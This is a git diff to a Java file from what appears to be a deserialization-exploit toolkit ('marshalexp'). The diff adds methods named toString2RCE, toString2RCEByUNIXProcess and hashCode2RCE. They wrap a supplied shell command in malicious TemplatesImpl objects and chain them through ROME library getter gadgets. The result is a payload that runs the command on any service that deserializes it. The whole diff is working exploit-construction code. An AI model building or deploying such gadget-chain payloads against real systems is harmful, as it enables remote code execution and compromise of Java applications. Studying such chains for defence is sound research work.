@@ -2,6 +2,11 @@ package xyz.eki.marshalexp.gadget.rome;
 
 
 import com.rometools.rome.feed.impl.ObjectBean;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import xyz.eki.marshalexp.gadget.jdk.GHashMap;
+import xyz.eki.marshalexp.sink.jdk.GTemplates;
+
+import javax.xml.transform.Templates;
 
 /**
  * Method.invoke(Object, Object...) -> getter None-Parameter
@@ -34,5 +39,22 @@ public class GRome {
 
     public static com.sun.syndication.feed.impl.EqualsBean  toString2GetterSynd(Object o){
         return toString2GetterSynd(o.getClass(),o);
+    }
+
+    public static Object toString2RCE(String cmd) throws Exception{
+        TemplatesImpl templatesimpl = GTemplates.getEvilTemplates(cmd);
+        Object o = GRome.toString2Getter(Templates.class,templatesimpl);
+        return o;
+    }
+
+    public static Object toString2RCEByUNIXProcess(String cmd) throws Exception{
+        TemplatesImpl templatesimpl = GTemplates.getEvilTemplatesByUNIXProcess(cmd);
+        Object o = GRome.toString2Getter(Templates.class,templatesimpl);
+        return o;
+    }
+
+
+    public static Object hashCode2RCE(String cmd) throws Exception{
+        return toString2RCE(cmd);
     }
 }
